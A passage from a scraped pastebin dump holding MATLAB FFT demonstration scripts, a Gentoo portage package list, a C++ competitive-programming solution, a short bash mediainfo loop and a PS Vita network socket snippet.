s2 = A2*cos(2*pi*f2*t + phase2);
s3 = A3*cos(2*pi*f3*t + phase3);
s = s1 + s2 + s3;
s = [s zeros(1, 2000)];
t_extra = duration : Ts : duration + 1999*Ts;
t = [t t_extra];

%% C3. Plotting in time-domain
figure();
plot(t, s);
xlabel('Time [sec]');
ylabel('Amplitude');
title('Time-domain plot - After zero-padding');


%% C4. Fast Fourier Transform - Samples
S = fft(s);                     % Also 'N' samples
figure();
plot(abs(S));
xlabel('Samples');
ylabel('Magnitude');
title('Samples-domain plot');


%% C5. Convert samples into frequencies by keeping the LHS of plot
N2 = length(s);
S_oneside = S(1 : N2/2);
f = Fs * (0 : N2/2 - 1) / N2;
S_meg = abs(S_oneside) / (N2/2);
figure();
plot(f, S_meg);
xlabel('Frequency [Hz]');
ylabel('Amplitude');
title('Frequency-domain plot (Main and side lobes)');"
kjfCkk0L,FFT2 - FD plot when duration!=kT - Spectral spread,makispaiktis,MatLab,Sunday 9th of July 2023 11:32:06 AM CDT,"clear all
close all
clc

%% B1. Change duration
% New duration != integer number of signal cycles

Fs = 500;                   % Sampling Frequency   [Hz]
duration = 0.64;            % Signal time duration [sec]
Ts = 1 / Fs;                % Sampling period      [sec]
t = 0 : Ts : duration - Ts;
N = length(t);              % Num of samples 
    

%% B2. Signal parameters
A1 = 3;     f1 = 30;    phase1 = 0.6;
A2 = 2;     f2 = 45;    phase2 = -0.8;
A3 = 1;     f3 = 70;    phase3 = 2;
s1 = A1*cos(2*pi*f1*t + phase1);
s2 = A2*cos(2*pi*f2*t + phase2);
s3 = A3*cos(2*pi*f3*t + phase3);
s = s1 + s2 + s3;


%% B3. Plotting in time-domain
figure();
plot(t, s);
xlabel('Time [sec]');
ylabel('Amplitude');
title('Time-domain plot');


%% B4. Fast Fourier Transform - Samples
S = fft(s);                     % Also 'N' samples
figure();
plot(abs(S));
xlabel('Samples');
ylabel('Magnitude');
title('Samples-domain plot');


%% B5. Convert samples into frequencies by keeping the LHS of plot
S_oneside = S(1 : N/2);
f = Fs * (0 : N/2 - 1) / N;
S_meg = abs(S_oneside) / (N/2);
figure();
plot(f, S_meg);
xlabel('Frequency [Hz]');
ylabel('Amplitude');
title('Frequency-domain plot (Spectral Spread)');"
pvaFke94,FFT1 - TD and FD plots when duration=kT - Sharp spikes,makispaiktis,MatLab,Sunday 9th of July 2023 11:30:54 AM CDT,"clear all
close all
clc

%% A1. Basics
Fs = 500;                   % Sampling Frequency   [Hz]
duration = 2;               % Signal time duration [sec]
Ts = 1 / Fs;                % Sampling period      [sec]

t = 0 : Ts : duration - Ts;
N = length(t);              % Num of samples 
    

%% A2. Signal parameters
A1 = 3;     f1 = 30;    phase1 = 0.6;
A2 = 2;     f2 = 45;    phase2 = -0.8;
A3 = 1;     f3 = 70;    phase3 = 2;

s1 = A1*cos(2*pi*f1*t + phase1);
s2 = A2*cos(2*pi*f2*t + phase2);
s3 = A3*cos(2*pi*f3*t + phase3);
s = s1 + s2 + s3;


%% A3. Plotting in time-domain
figure();
plot(t, s);
xlabel('Time [sec]');
ylabel('Amplitude');
title('Time-domain plot');


%% A4. Fast Fourier Transform - Samples
S = fft(s);                     % Also 'N' samples
figure();
plot(abs(S));
xlabel('Samples');
ylabel('Magnitude');
title('Samples-domain plot');


%% A5. Convert samples into frequencies by keeping the LHS of plot
S_oneside = S(1 : N/2);
f = Fs * (0 : N/2 - 1) / N;
S_meg = abs(S_oneside) / (N/2);

figure();
plot(f, S_meg);
xlabel('Frequency [Hz]');
ylabel('Amplitude');
title('Frequency-domain plot (Sharp Spikes)');


%% A6. Discover the sinus phases
ph1 = angle(S_oneside(f1*duration+1))
ph2 = angle(S_oneside(f2*duration+1))
ph3 = angle(S_oneside(f3*duration+1))


"
Ek6iv9cG,Portage world file,Realmagnum,Bash,Sunday 9th of July 2023 11:21:32 AM CDT,"sip ~ # cat /var/lib/portage/world
app-admin/logrotate
app-admin/syslog-ng
app-crypt/openpgp-keys-gentoo-release
app-editors/nano
app-misc/mc
app-misc/tmux
app-portage/eix
app-portage/gentoolkit
app-text/xmlto
dev-db/mariadb
dev-db/phpmyadmin
dev-lang/lua
dev-lang/php
dev-lang/python
dev-lang/python-exec
dev-libs/libgcrypt
dev-libs/newt
dev-perl/File-MimeInfo
dev-php/jpgraph
dev-python/certifi
dev-python/django
dev-python/packaging
dev-python/pillow
dev-python/pyxattr
dev-ruby/rubygems
dev-util/ccache
dev-util/cmake
dev-util/pkgconfig
dev-vcs/git
dev-vcs/subversion
mail-client/mailx
mail-mta/ssmtp
media-fonts/corefonts
media-fonts/cronyx-fonts
media-fonts/freefonts
media-fonts/intlfonts
media-fonts/terminus-font
media-libs/gd
media-libs/openjpeg
media-libs/spandsp
media-libs/tiff
media-sound/gsm
media-sound/lame
media-sound/mpg123
media-sound/sox
net-analyzer/tcpdump
net-analyzer/trafshow
net-dns/bind
net-firewall/iptables
net-ftp/ftp
net-ftp/tftp-hpa
net-ftp/vsftpd
net-mail/sendEmail
net-misc/asterisk
net-misc/dhcp
net-misc/dhcpcd
net-misc/ntp
net-misc/telnet-bsd
net-misc/vconfig
net-misc/whois
sys-apps/attr
sys-apps/dmidecode
sys-apps/install-xattr
sys-apps/iproute2
sys-apps/lm-sensors
sys-apps/pciutils
sys-apps/portage
sys-apps/sandbox
sys-apps/smartmontools
sys-apps/sysvinit
sys-apps/usbutils
sys-boot/grub-static
sys-devel/autoconf
sys-devel/automake
sys-devel/binutils
sys-devel/libtool
sys-fs/eudev
sys-fs/mdadm
sys-fs/reiserfsprogs
sys-kernel/genkernel
sys-kernel/gentoo-sources
sys-kernel/linux-firmware
sys-libs/glibc
sys-libs/ncurses
sys-libs/timezone-data
sys-power/acpid
sys-process/atop
sys-process/cronie
sys-process/htop
www-apache/mod_python
www-client/links
www-servers/apache"
PkN8UkuK,POI Task Monkeys,erek1e,C++,Sunday 9th of July 2023 11:16:27 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>

using namespace std;

// DSU
vector<int> parent;
vector<vector<int>> component;
int root(int i) {
    return parent[i] < 0 ? i : (parent[i] = root(parent[i]));
}
void unite(int i, int j) {
    i = root(i), j = root(j);
    if (i == j) return;
    if (parent[i] > parent[j]) swap(i, j);
    parent[i] += parent[j];
    component[i].insert(component[i].end(), component[j].begin(), component[j].end());
    parent[j] = i;
    component[j].clear();
}

int main() {
    ios_base::sync_with_stdio(0); cin.tie(0); cout.tie(0);
    int n, m; cin >> n >> m;
    vector<vector<int>> holding(1+n, vector<int>(2, -1));
    for (int i = 1; i <= n; ++i) cin >> holding[i][0] >> holding[i][1];
    vector<pair<int, int>> changes(m);
    for (int i = 0; i < m; ++i) {
        int monkey, hand; cin >> monkey >> hand;
        --hand;
        int &fellow = holding[monkey][hand];
        changes[i] = {monkey, fellow};
        fellow = -1;
    }

    // dsu with component members with additional log(n)
    parent.assign(1+n, -1);
    component.resize(1+n);
    for (int i = 1; i <= n; ++i) component[i] = {i};
    for (int i = 1; i <= n; ++i) {
        for (int j = 0; j < 2; ++j) {
            if (holding[i][j] != -1) unite(i, holding[i][j]);
        }
    }

    vector<int> groundTime(1+n);
    int r = root(1);
    for (int x : component[r]) groundTime[x] = -1;

    for (int i = (int)changes.size()-1; i >= 0; --i) {
        auto [monkey, fellow] = changes[i];
        r = root(1);
        int r1 = root(monkey), r2 = root(fellow);
        if (r1 == r2) continue;
        if (r2 == r) swap(monkey, fellow), swap(r1, r2);
        if (r1 == r) {
            for (int x : component[r2]) groundTime[x] = i;
        }
        unite(monkey, fellow);
    }
    for (int i = 1; i <= n; ++i) cout << groundTime[i] << '\n';
    return 0;
}"
Vvm83PFd,mediainfo_of_all_mkv.sh,ibi,Bash,Sunday 9th of July 2023 11:10:58 AM CDT,"for hdl in /mnt/piggy/medien/video/movies/HD/*.mkv; do echo -n ""."" && mediainfo $hdl > $(basename $hdl).log; done"
g7VjEspZ,vita scenet sockets connect to host,M_Ibrahim77,C++,Sunday 9th of July 2023 10:55:28 AM CDT,"   // Now establish a wss connection with sockets
 
    // First we need to get the IP address from the hostname
    resvID = sceNetResolverCreate(""vcpp_resolver"", &resvParam, 0);
    print(""resvID %d\n"", resvID);

    if(resvID < 0)
    {
        print(""Failed to create resolver\n"");
        goto end;
    }
    print(""%s\n"", host.c_str());
    res = sceNetResolverStartNtoa(resvID, host.c_str(), &sockAddr.sin_addr, 0, 0, 0);

    sceNetResolverDestroy(resvID);

    if(res < 0)
    {
        print(""Failed to get hostAddr!: 0x%X\n"", res);
        goto end;
    }

    print(""Got host addr: %u\n"", sockAddr.sin_addr);

    // Now set the remaining socket params
    sockAddr.sin_family = SCE_NET_AF_INET;
    sockAddr.sin_port = sceNetHtons(443);

    // create our socket
    sockID = sceNetSocket(""vcpp_gateway"", SCE_NET_AF_INET, SCE_NET_SOCK_STREAM, 0);
    if(sockID < 0)
    {
        print(""Failed to create socket. 0x%X\n"", sockID);
        goto end;    
    }

    res = sceNetConnect(sockID, &sockAddr, sizeof(sockAddr));
    print(""Connection result: %d\n"", res);
    while(true)
    {
        print(""%d\n"", sceNetRecv(sockID, nullptr, 0x1000, SCE_NET_MSG_PEEKLEN | SCE_NET_MSG_DONTWAIT));
        sceKernelDelayThread(1000);
    }

    sceNetSocketClose(sockID);"
